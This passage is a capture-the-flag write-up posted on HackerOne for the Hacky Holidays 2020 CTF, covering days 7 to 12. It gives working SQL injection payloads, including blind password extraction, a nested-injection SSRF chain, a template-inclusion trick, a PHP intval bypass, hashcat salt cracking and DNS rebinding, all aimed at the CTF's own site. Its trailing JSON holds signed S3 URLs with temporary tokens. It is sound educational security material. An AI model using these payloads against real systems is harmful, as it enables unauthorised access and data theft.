,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/\n\n       v1.2.0-git\n________________________________________________\n\n :: Method           : GET\n :: URL              : https://hackyholidays.h1ctf.com/hate-mail-generator/FUZZ\n :: Wordlist         : FUZZ: common_webcontent.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 5\n :: Matcher          : Response status: 200,204,301,302,307,401,403\n________________________________________________\n\nnew                     [Status: 200, Size: 2494, Words: 440, Lines: 49]9] :: Errors: 0 ::\ntemplates               [Status: 302, Size: 0, Words: 1, Lines: 1]0:01:40] :: Errors: 0 ::\n:: Progress: [4661/4661] :: Job [1/1] :: 41 req/sec :: Duration: [0:01:56] :: Errors: 0 ::\n```\n\nAnd yes we did! Let's navigate to `/templates` and see what we got:\n\n{F1139691}\n\nGreat! We found the location of the template files! The file `38dhs_admins_only_header.html` seems very interesting! Unfortunately, we can't open any of the files directly from the browser:\n\n{F1139684}\n\nBut let's just include the file, using the following syntax in our own mail template:\n\n`{{template:38dhs_admins_only_header.html}}`\n\nAnd preview it:\n\n```\nHTTP/1.1 200 OK\nServer: nginx/1.18.0 (Ubuntu)\nDate: Wed, 30 Dec 2020 13:04:33 GMT\nContent-Type: text/html; charset=UTF-8\nConnection: close\nContent-Length: 64\n\nYou do not have access to the file 38dhs_admins_only_header.html\n```\n\nWell that's not good... Time to try harder like a true 1337 hacker! Remeber how we discovered earlier that we can provide our own data to be used in the preview generation? What happens if the value of a variable is set to the syntax of including a file? The idea would be as follows:\n\n`preview_markup={{hihi}}\u0026preview_data={\"hihi\":\"{{template:38dhs_admins_only_header.html}}\"}`\n\nThe variable 'hihi' is replaced with the specified value:\n\n`{{hihi}} -\u003e {{template:38dhs_admins_only_header.html}}`\n\nWe cross our fingers and hope magic happens:\n\n`{{template:38dhs_admins_only_header.html}} -\u003e plz give me flag`\n\n{F1139687}\n\nAwesome! Our idea worked! We successfully got the 7th flag and are one step closer to take down the Grinch Networks\n\n`flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}`\n\n## Day 8\n\nIt's a brand new day and I'm wondering if there could possibly be a new challenge... Well what a suprise! A new challenge has been added called 'Forum'. We're informed that the Grinch keeps his best post in the admin section, but that we need a valid login to acces that. Starting the challenge we can see a basic forum. Our actions however is very limited since we're not logged in, so let's work on that! Once again let's give FFUF a go with one of our favorites, 'common.txt':\n\n```\nffuf -w common_webcontent.txt -t 5 -u \"https://hackyholidays.h1ctf.com/forum/FUZZ\"\n\n        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/\n\n       v1.2.0-git\n________________________________________________\n\n :: Method           : GET\n :: URL              : https://hackyholidays.h1ctf.com/forum/FUZZ\n :: Wordlist         : FUZZ: common_webcontent.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 5\n :: Matcher          : Response status: 200,204,301,302,307,401,403\n________________________________________________\n\n1                       [Status: 200, Size: 2249, Words: 788, Lines: 64] :: Errors: 0 ::\n2                       [Status: 200, Size: 1885, Words: 512, Lines: 58]] :: Errors: 0 ::\nlogin                   [Status: 200, Size: 1569, Words: 396, Lines: 34]1] :: Errors: 0 ::\nphpmyadmin              [Status: 200, Size: 8880, Words: 956, Lines: 79]5] :: Errors: 0 ::\n:: Progress: [4661/4661] :: Job [1/1] :: 41 req/sec :: Duration: [0:01:54] :: Errors: 0 ::\n```\n\n`/phpmyadmin` seems interesting!\n\n{F1139698}\n\nHmm, it appears to be a totally legit original phpMyAdmin login page. But what now? Trying to brute-force the login page on both `/login` and `/phpmyadmin` doesn't seem feasible, belive my, I tried. If only we new more about how the forum works... If only there where some way we could view the source code... If only there existed a common place where a lot of people store their code online for anyone to view... If only I could get a sweet brand new unlimited Burp Suite Professional license for Christmas this year... I think I lost the thread there. But what about GitHub?? While it proably can't give me that license, it might be able to give me the source code for the forum! Let's check Adam Langley's GitHub\n\n{F1139696}\n\nBingo! We discovered a Git Repository containing the source code of the Forum! We can see that 4 commits has been made. Time to dig into the code and see what we can find. The commit called 'Initial Code Commit' seems interesting. And look at that:\n\n{F1139695}\n\nLooks like we just found some database credentials! Let's test them on `/phpmyadmin`:\n\n{F1139693}\n\nThey worked! We now have access to the database! The 'user' table looks interesting. We can see that there exists two users on the forum: 'grinch' and 'max'. We can also see their passwords, but in an encrypted form. Let's see if we can crack password for the user 'grinch'. Before we go crazy with hashcat, let's quickly see if we're lucky enough that crackstation.net does the job for us:\n\n{F1139692}\n\nLook at that! It actually did work! We've successfully cracked the password and can now log in on the forum:\n\n{F1139694}\n\nGreat! We got access to the admin section and have successfully got the 8th flag!\n\n`flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}`\n\n## Day 9\n\nFeeling in the mood for a quiz today, it's a pleasant surprise to see that the Grinch has provided us with a quiz as the next challenge, 'Evil Quiz'\n\n{F1139702}\n\nUpon completing the quiz, we're met with the following screen:\n\n{F1139703}\n\nThe feature that allow us to see how many players have the same name as us seems very interesting.\n\nBeeing a 1337 hacker and seeing an input field, the next move seems obvious: Spraying the input field with every single just slightly good idea of a payload we can come up with.\n\n{F1139704}\n\nWell that was definitely an interesting response! It seems safe to assume that there's not 1218510 other players with that exact name, so we've probably found an SQLi! Now comes the fun part, exploitation.\n\nLet's start by see if we can make an UNION attack. To do so, we need to figure out how many columns are returned by the original SQL query. This can be achieved by using the SELECT statement to select eg. an increasing number of integers.\n\n- `bla' UNION SELECT '1`\n- `bla' UNION SELECT 1,'2`\n- `bla' UNION SELECT 1,2,'3`\n- Etc.\n\nWe then need to look for the response. In this case, an error in the SQL query will result in a response stating that there's 0 other players with the same name as us, while a succesful query will tell us that there's 1 other player with the same name. Let's start testing.\n\n{F1139705}\n\nWe now know that there's 4 columns and can go to the next step of our exploitation. The table `information_schema.tables` can be quiered for existing tables in the database. A table with a name like 'admin' is probaly a good guess. Let's test if there exists any tables called 'admin' with the following payload:\n\n`bla' UNION SELECT 1,2,3,4 from information_schema.tables WHERE table_name = 'admin`\n\n{F1139697}\n\nWe see that 1 other player has the same name as us, meaning that there indeed is a table with the anme 'admin' and that our guess was correct!\n\nWe can now use the table `information_schema.columns` to figure out which columns exists in the 'admin' table. Let's check for a 'username' and 'password' column using these two payloads:\n\n`bla' UNION SELECT 1,2,3,4 from information_schema.columns WHERE table_name = 'admin' AND column_name = 'username`\n\n`bla' UNION SELECT 1,2,3,4 from information_schema.columns WHERE table_name = 'admin' AND column_name = 'password`\n\nBoth payloads results in the message telling us that 1 other player has the same name, meaning that there indeed exists both a 'username' column and 'password' column exists in the 'admin' table. Let's figure out how many users exists in this table by using the LIKE operator:\n\n`bla' UNION SELECT 1,2,3,4 from admin WHERE username LIKE '%`\n\n{F1139701}\n\nApparently only one user exists in the admin table. What could the username possible be..? Well, how about admin:\n\n`bla' UNION SELECT 1,2,3,4 from admin WHERE username = 'admin`\n\n{F1139699}\n\nYup, thhe one user in the 'admin' table's username is 'admin'. Now we just have to figure out what the user's password is. How hard can that be? Well, turns out it's actually a bit difficult. Since we're 1337 hackers and don't want to spend the rest of the night manually brute-forcing the password, we use our non-existing python skills to write a script that can do the job for us. The main idea of the script is to use the LIKE operator to brute-force the password one character at the time, with paylaods in the following format:\n\n`bla' UNION SELECT 1,2,3,password FROM admin WHERE password LIKE BINARY('passwo%') OR 1='2`\n\nWe're using the BINARY function to make the query case-sensitive. Let's run our script go wrap some Christmas presents while we wait.\n\nYay, our script is done and has extracted the password, 'S3creT_p4ssw0rd-$', from the database! We can now login with the credentials:\n\n{F1139700}\n\n[Insert your favorite triumph interjection]! We solved the challenge and got the 9th flag! Time to go to bed.\n\n`flag{6e8a2df4-5b14-400f-a85a-08a260b59135}`\n\n## Day 10\n\nTody the Grinch is recruting for his army in the challenge 'Signup Manager'. Let's dive in and find the flag!\n\n{F1139708}\n\nThe challenge gives us the oppotunity to sign up for the recruitment. Let's try that with some random info:\n\n{F1139710}\n\nHmm, that wasn't super interesting. Let's take a look at the source of the page:\n\n{F1139709}\n\n'README.md'! That sounds interesting! Let's try to navigate to `/README.md`. By doing so, we get the following file:\n\n```\n# SignUp Manager\n\nSignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.\n\n### How to Install\n\n1) Create a directory that you wish SignUp Manager to be installed into\n\n2) Move signupmanager.zip into the new directory and unzip it.\n\n3) For security move users.txt into a directory that cannot be read from website visitors\n\n4) Update index.php with the location of your users.txt file\n\n5) Edit the user and admin php files to display your hidden content\n\n6) You can make anyone an admin by changing the last character in the users.txt file to a Y\n\n7) Default login is admin / password\n```\n\nThe file mentions the zip folder 'signupmanager.zip', let's check if we're lucky enough that the zip file can be donloaded from the website.\n\n{F1139711}\n\nWe where! And the zip file contains the source code of the recruiter page as seen above! Time to dive into the source code. The file `index.php` is definitely the most interesting one.\n\nWhen signing up, all the info provided is concatenated to a string and stored in the 'users.txt' file. The 113th character determines whether or not a given user is an admin. If the 113 charcater is 'Y', the user is an admin or else not. The check to determine this is done in the following line from 'index.php':\n\n```PHP\n'admin' =\u003e ((substr($user_str, 112, 1) === 'Y') ? true : false)\n```\n\nOur goal appears to simply be to have the 113th char set to Y, so we become admins. Can't we just do something like provide a really long name ending with a 'Y' then? Well it isn't that simple sadly since the length of each input we give is controlled:\n\n- The username, first name and last name is cut of to be max 15 chars, eg.:\n\n```PHP\n$username = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST[\"username\"]), 0, 15);\n```\n\n- The password is MD5 hashed, making it fixed at 32 chars\n\n```PHP\n$password = md5($_POST[\"password\"]);\n```\n\n- The length of the age must be 3 chars or less\n\n```PHP\nif (strlen($_POST[\"age\"]) \u003e 3) {\n    $errors[] = 'Age entered is too long';\n}\n```\n\nSo where is the weak link? Noticing the following line made my eyes widen:\n\n```PHP\n$age = intval($_POST[\"age\"]);\n```\n\nThis line comes **after** the initial length check. PHP has some interesting behaviour when converting strings to Integers using `intval`. Scientific notation is eg. allowed, meaning that something like '3e2' will be converted to '9'. This is super interesting for us in this case since we can provide something as '9e9' which has a length of 3 chars, but will become some big number after beeing converted with `intval`: '9000000000'. A number which is longer than 3 chars.\n\nLet's take a look at how the input is concatenated:\n\n```PHP\nfunction addUser($username,$password,$age,$firstname,$lastname){\n    $random_hash = md5( print_r($_SERVER,true).print_r($_POST,true).date(\"U\").microtime().rand() );\n    $line = '';\n    $line .= str_pad( $username,15,\"#\");\n    $line .= $password;\n    $line .= $random_hash;\n    $line .= str_pad( $age,3,\"#\");\n    $line .= str_pad( $firstname,15,\"#\");\n    $line .= str_pad( $lastname,15,\"#\");\n    $line .= 'N';\n    $line = substr($line,0,113);\n    file_put_contents('users.txt',$line.PHP_EOL, FILE_APPEND);\n    return $random_hash;\n}\n```\n\nAs we can see, the user's last name is the last input in the concatenation meaning this is the input where we need to insert the 'Y' at the end. Normally the 15th char of the user's last name would be the 112th character of the concatenated string, one short of the magic 113th char which toggles whether or not the user is an admin. Let's make an exploit!\n\nThe idea is to make the age be 4 chars long after the `intval` conversion. We can then set the last char of the last name to 'Y' which will now be the 113th char since the length of the user's age has become one char longer than expected. A value such as '9e3' will do the job as the age since it'll become '9000' (4 chars) after conversion with `intval`. Let's see if our exploit works:\n\n{F1139706}\n\nLet's grab the cookie from the response and reload `/signup-manager` authenticated as our newly created user:\n\n{F1139707}\n\nI'm-really-running-out-of-new-ways-to-express-excitement! We got the 10th flag!!! Note that we also got a link to `/r3c0n_server_4fdk59` which is where we should continue our jurney tomorrow.\n\n`flag{99309f0f-1752-44a5-af1e-a03e4150757d}`\n\n## Day 11\n\nChristmas is comming. We're getting close to the crucial day the Grinch is planning his DDoS attack against Santa. Let's start todays challenge to see what we are dealing with:\n\n{F1139830}\n\nIn todays challenge we get informed that an API is currently being developed. Let's head over to `/api` to see if we find anything:\n\n{F1139712}\n\nWe get a nice description of the different responses we can expect from the API, let's try to find some endpoints! Hmm, that doesn't work out well. No matter what great guesses of endpoints we can come up with, we're met with the following error:\n\n`{\"error\":\"This endpoint cannot be visited from this IP address\"}`\n\nHmm, seems like we should take another path. The challenge also allow us to browse some photo albums on `/album`:\n\n{F1139714}\n\nLet's try to open up one of the photos in a new tab:\n\n{F1139852}\n\nHmm, the GET parameter `data` seems interesting. Let's Base64 decode it:\n\n```JSON\n{\n    \"image\":\"r3c0n_server_4fdk59\\/uploads\\/0a382c6177b04386e1a45ceeaa812e4e.jpg\",\n    \"auth\":\"ec5a9920e177ccc84974146f93ae04b0\"\n}\n```\n\nLooks like the server is kind enough to go fecth a file we've specified in the `image` parameter as long as we provide it along with a propper `auth` value. Maybe there's potential for some SSRF vulnerability here? Maybe we could get access to the API by quering it through this feature? Let's note that idea down before we continue.\n\nIt seems difficult to figure out how the value of the `auth` parameter is generated and after some testing I decided to try to take a different path. Let's go back to the `/album` page.\n\nThe album's seems to be returned based on the value of the GET parameter `hash`. Let's do some testing on this parameter.\n\nMost values results in a 404, but take a look at this:\n\n{F1139843}\n\nLooks like we just found a SQLi! Let's try to do an UNION attack. This caused me a headache. It didn't seem to work no matter the amount of columns I tried to match. But finally I found a working payload:\n\n```SQL\na' UNION SELECT 1,2,3-- -\n```\n\n{F1139847}\n\nThe problem turned out to be that I couldn't provide a valid hash and do the UNION attack. Instead I had to provide something invalid such as 'a'. Hmm, that's weird. What could the context of this SQLi be? What does the full SQL query look like?\n\nAfter exploring the database we can conclude that there doesn't seem to be any interesting information. The only two tables appears to be 'album' and 'photo' which doesn't contain anything interesting.\n\nThe wierd behaviour of the SQLi still puzzles me. Let's see if we can get a better understadning of the SQL query we're injecting our payload into. After some googling I discovered that the table `information_schema.processlist` can be queried to get information of the current SQL query being executed. Let's use that to see what the current query looks like:\n\n```SQL\na'UNION SELECT 1,2,info from information_schema.processlist-- -\n```\n\n{F1139846}\n\nHmm, that's wierd. The original SQL query appears to simple be:\n\n```SQL\nSELECT * FROM album WHERE hash = 'INPUT'\n```\n\nHow can such a simple query result in this wierd behaviour. And how can that query alone return the correct photos? The photos aren't even referenced in the 'album' table. They are only being referenced in the 'photo' table... Wait... Maybe there is more going on here. What if it's actually a dream within a dream within... Whoops, wrong train of thought. Let me try again: What if it's actually a SQL query within a SQL query? Also known as a subquery. Maybe the 'parent' query looks something like this:\n\n```SQL\nSELECT * FROM photo WHERE something = (SELECT * FROM album WHERE hash = 'INPUT')\n```\n\nMaybe we can do a SQLi within a SQli? Let's start by figuring out which of the columns affect the photos being loaded. Let's start by providing some giberish string as the first:\n\n```SQL\na'UNION SELECT \"hihi\",2,3-- -\n```\n\n{F1139845}\n\nWell the photos are gone. It seems like the value of the first column affects which photos are loaded.\n\nNow let's try to actually do a SQLi within a SQLi:\n\n```SQL\na'UNION SELECT \"' UNION SELECT 1,2,3-- -\",2,3-- -\n```\n\n{F1139844}\n\nIt looks like a photo is attempted to be displayed. Let's open it up in a new tab:\n\n{F1139850}\n\nExciting! Let's try and Base64 decode the `data` parameter for the photo:\n\n```JSON\n{\n    \"image\":\"r3c0n_server_4fdk59\\/uploads\\/3\",\n    \"auth\":\"fea7507478aa8225c022527b1763fb33\"\n}\n```\n\nYes! Notice the '3'? We successfully got the server to generate a valid `auth` value based on our input! Let's try to swap the '3' for the value '../api':\n\n```SQL\na'UNION SELECT \"' UNION SELECT 1,2,'../api'-- -\",2,3-- -\n```\n\n{F1139851}\n\n'Invalid content type detected' - sounds like we successfully made the server request en existing resource! The API endpoint! Let's check the Base64 decoded `data` value:\n\n```JSON\n{\n    \"image\":\"r3c0n_server_4fdk59\\/uploads\\/..\\/api\",\n    \"auth\":\"38122d477657c1a0c9ba873c11017497\"\n}\n```\n\nPerfect! We've successfully made the server request `r3c0n_server_4fdk59/api` for us! Let's now create a script to fuzz for valid API endpoints.\n\n```\npy day_10.py -p \"api/BRUZZ\" -w \"common-api-endpoints-mazen160.txt\" -f 404\nFOUND: ping\nFOUND: user\n100%|█████████████████████████████████████████████████████████████████████████████████████████████████████| 174/174 [02:30\u003c00:00,  1.16it/s]\n```\n\nOur script found two endpoints! `api/ping` and `api/user`. `api/ping` turned out to be a red herring (thanks Adam...) so I'll spare you the confusion and move on to the second found: `api/user`. Let's check which response we get for this endpoint:\n\n{F1139848}\n\nHmm, that's a bit disappointing... Pretty frustrating to know that some reponse body is returned but we can't view it... After trying to circumvent this problem wittout succeeding I decided to take a different path. Maybe there's more fuzzing to do? Looking at the list of different response codes we got listed on `r3c0n_server_4fdk59/api` it seems like we might have more to discover.\n\n{F1139716}\n\nThis seems like a pretty interesting feature. Maybe there's some GET parameters to be found on `api/user`? Let's try providing some random GET parameter as a test:\n\n```SQL\na'UNION SELECT \"' UNION SELECT 1,2,'../api/user?bla=hihi'-- -\",2,3-- -\n```\n\n{F1139715}\n\nYup, as expected we got a 400 response. We could now start our fuzzing script up again, but before doing that, we could try and use our 1337 hacking brains to make some qualified guesses.\n\nOne thing I haven't mentioned yet, is the link to `/attack-box` this challenge provides us with on the front page. `/attack-box` appears to be the next challenge, but we're faced with a login form we need to submit to access `/attack-box`.\n\nWith this in mind and having an idea of where this challenge is going and knowing that our API endpoint is called `user`, something as 'username' and 'password' seems like pretty good guesses. Let's try them:\n\n```SQL\na'UNION SELECT \"' UNION SELECT 1,2,'../api/user?username=bla%26password=hihi'-- -\",2,3-- -\n```\n\n{F1139713}\n\nBingo! Seems like we just found two valid GET parameters using our 1337 guessing skills! Now we just need to figure out the correct credentials to provide. But how? It seems safe to assume that we're interfering with the databse when providing the credentials. If only there existed some way to provide a wildcard in SQL... Well, what about the '%' char? Let's try that:\n\n```SQL\na'UNION SELECT \"' UNION SELECT 1,2,'../api/user?username=%%26password=%'-- -\",2,3-- -\n```\n\n{F1139842}\n\nOkay-seriously-can-someone-provide-me-with-a-list-of-exclamations! Seems like the '%' works as a wildcard since we didn't get the 204 response, but instead a 'Invalid content type detected' meaning some data was attempted to be returned. Time to modify our script a bit and fire it up in brute-force mode:\n\n```\npy day_10.py -u \"api/user?username=BRUZZ%\" -b -f 204\nNEW CHAR FOUND: g\nNEW CHAR FOUND: gr\nNEW CHAR FOUND: gri\nNEW CHAR FOUND: grin\nNEW CHAR FOUND: grinc\nNEW CHAR FOUND: grinch\nNEW CHAR FOUND: grincha\nNEW CHAR FOUND: grinchad\nNEW CHAR FOUND: grinchadm\nNEW CHAR FOUND: grinchadmi\nNEW CHAR FOUND: grinchadmin\nCouldn't find more chars. Final found is: grinchadmin\n```\n\nCool, we successfully brute-forced the username: 'grinchadmin'. Time for the password:\n\n```\npy day_10.py -u \"api/user?password=BRUZZ%\" -b -f 204\nNEW CHAR FOUND: s\nNEW CHAR FOUND: s4\nNEW CHAR FOUND: s4n\nNEW CHAR FOUND: s4nt\nNEW CHAR FOUND: s4nt4\nNEW CHAR FOUND: s4nt4s\nNEW CHAR FOUND: s4nt4su\nNEW CHAR FOUND: s4nt4suc\nNEW CHAR FOUND: s4nt4suck\nNEW CHAR FOUND: s4nt4sucks\nCouldn't find more chars. Final found is: s4nt4sucks\n```\n\nEvax(Latin, duh)! We also got the password now! (Thanks so much for not doing some case-sensitive stuff Adam)\nLet's try our credentials on `/attack-box/login`:\n\n{F1139849}\n\nFINALLY! That was a tough challenge, but we did it! We finally got the 11th flag and access to `/attack-box` let's try to sleep a few hours before the night is over and come back tomorrow.\n\n`flag{07a03135-9778-4dee-a83c-7ec330728e72}`\n\n## Day 12\n\nChestnuts roasting on an open fire, the Grinch is DDoSing Santa Clause ♫\n\nWait what? We better get to work to save the Christmas! Navigating to `/attack-box` we see that the page has been updated:\n\n{F1139836}\n\nIt looks like the Grinch has launched a DDoS attack against Santa's severs! Just as the hidden event from day 6 said. Clicking one of the 'attack' buttons, we see the following screen:\n\n{F1139837}\n\nRight before ending at the screen, we see a request was made to `/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==`. Let's try to Base64 decode the `payload` parameter:\n\n```JSON\n{\n    \"target\":\"203.0.113.33\",\n    \"hash\":\"5f2940d65ca4140cc18d0878bc398955\"\n}\n```\n\nHmm, looks like this request is used to launch a DDoS attack against the target specified in the `taget` parameter. Maybe we could trick the server into launcing a DDoS attack against it self? Let's note that idea down and continue.\n\nSadly, we can't just modify the `target` parameter without providing a matching `hash`. Trying to do so gives us the following error:\n\n`Invalid Protection Hash`\n\nAfter browsing around the challenge I decided to go full beast mode and see if we could possibly crack the hash. It looks like it's a MD5 hash. Maybe a salt is used with the `target` value to generate the hash? Let's use `rockyou.txt` with hashcat to see if it that's the case. Let's start by testing for `salt.pass`:\n\n```\nhashcat.exe -m 20 \"5f2940d65ca4140cc18d0878bc398955:203.0.113.33\" rockyou.txt --show\n5f2940d65ca4140cc18d0878bc398955:203.0.113.33:mrgrinch463\n```\n\nWow! It actually worked! We got the salt: 'mrgrinch463'. Now let's just create our own Base64 encoded payload to launch an attack against `127.0.0.1` to end Grinch Netork once and for all:\n\n`md5(mrgrinch463127.0.0.1) -\u003e 3e3f8df1658372edf0214e202acb460b`\n\n```JSON\n{\n    \"target\":\"127.0.0.1\",\n    \"hash\":\"3e3f8df1658372edf0214e202acb460b\"\n}\n```\n\n{F1139835}\n\nEhhh... So that didn't work. The sneaky Grinch has set up some protection to avoid an attack against a local target. Dammit. After trying some different bypass techniques I was about to give up on Christmas this year, but then a last idea popped up. What about DNS rebinding? Could we maybe set up a host that first resolves to one of the Santa target servers and then to '127.0.0.1'? The idea is that when the check is made to make sure the target isn't local, our host resolves to a Santa target which will pass the check. When the attack is then launched, our host resolves to '127.0.0.1' instead, resulting in an attack against the Grinch Networks! Let's try this! We can use this online tool: https://lock.cmpxchg8b.com/rebinder.html to generate a hostname for the purpose (shoutout to rekter0 for showing me this tool)\n\n{F1139838}\n\nIt looks promising.\n\n{F1139839}\n\nWuhuu! We did it! We solved the 12 and last challenge, took down the Grinch Network and saved Christmas! Thanks for following along! You can relax and enjoy the holidays now well assured that the Grinch won't spoil it.\n\n`flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}`\n","automated_response":false,"created_at":"2020-12-31T15:43:39.381Z","updated_at":"2020-12-31T15:43:39.381Z","actor":{"username":"holme","cleared":false,"url":"/holme","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/oR64NYD1B7YVuyr3QEbru7tp/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":1139680,"filename":"day6_admin.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/xgg9mu0ihowyvwrna7ngz860urt4?response-content-disposition=attachment%3B%20filename%3D%22day6_admin.png%22%3B%20filename%2A%3DUTF-8%27%27day6_admin.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=60bbf77e74e11fb953209b3e0b1ee39085dba69fe38d35ff983281a904fc4a37"},{"id":1139681,"filename":"day5_zip_pass.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/f7snt09vnbwwpf14ch1knoqpr5ok?response-content-disposition=attachment%3B%20filename%3D%22day5_zip_pass.png%22%3B%20filename%2A%3DUTF-8%27%27day5_zip_pass.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=191de61e3d47d13502867a9527e4623733fdbc19c1e1b836cd0d28cd0e6333d4"},{"id":1139682,"filename":"day6_index.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/8ot1inlkbuoz5vh6mlm3cl215ufs?response-content-disposition=attachment%3B%20filename%3D%22day6_index.png%22%3B%20filename%2A%3DUTF-8%27%27day6_index.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAi